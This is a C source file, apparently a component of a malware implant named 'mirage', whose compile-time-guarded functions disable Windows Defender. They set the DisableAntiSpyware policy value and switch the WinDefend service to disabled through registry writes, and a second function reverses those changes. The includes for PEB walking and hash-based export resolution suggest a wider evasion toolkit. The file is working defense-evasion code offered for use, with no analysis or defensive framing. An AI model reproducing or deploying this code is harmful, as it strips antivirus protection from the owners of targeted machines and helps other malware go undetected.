#include "defender_disable.h"
#include "config.h"
#include "nt_types.h"

#ifdef ENABLE_DEFENDER_DISABLE
#include "hash.h"
#include "peb.h"
#include "export_resolve.h"
#include <string.h>
#include <windows.h>

/* ── Disable Windows Defender via registry ──────────────────── */

int mirage_defender_disable(void) {
    HKEY hKey;
    LONG result;
    
    /* Disable Real-time Monitoring */
    result = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender",
        0, KEY_SET_VALUE, &hKey);
    if (result == ERROR_SUCCESS) {
        DWORD val = 1;
        RegSetValueExW(hKey, L"DisableAntiSpyware", 0, REG_DWORD,
                       (BYTE*)&val, sizeof(val));
        RegCloseKey(hKey);
    }
    
    /* Disable via services */
    result = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\WinDefend",
        0, KEY_SET_VALUE, &hKey);
    if (result == ERROR_SUCCESS) {
        DWORD val = 4; /* SERVICE_DISABLED */
        RegSetValueExW(hKey, L"Start", 0, REG_DWORD,
                       (BYTE*)&val, sizeof(val));
        RegCloseKey(hKey);
    }
    
    return 0;
}

/* ── Re-enable Windows Defender ────────────────────────────── */

int mirage_defender_enable(void) {
    HKEY hKey;
    LONG result;
    
    result = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender",
        0, KEY_SET_VALUE, &hKey);
    if (result == ERROR_SUCCESS) {
        RegDeleteValueW(hKey, L"DisableAntiSpyware");
        RegCloseKey(hKey);
    }
    
    result = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\WinDefend",
        0, KEY_SET_VALUE, &hKey);
    if (result == ERROR_SUCCESS) {
        DWORD val = 2; /* SERVICE_AUTO_START */
        RegSetValueExW(hKey, L"Start", 0, REG_DWORD,
                       (BYTE*)&val, sizeof(val));
        RegCloseKey(hKey);
    }
    
    return 0;
}

#endif /* ENABLE_DEFENDER_DISABLE */
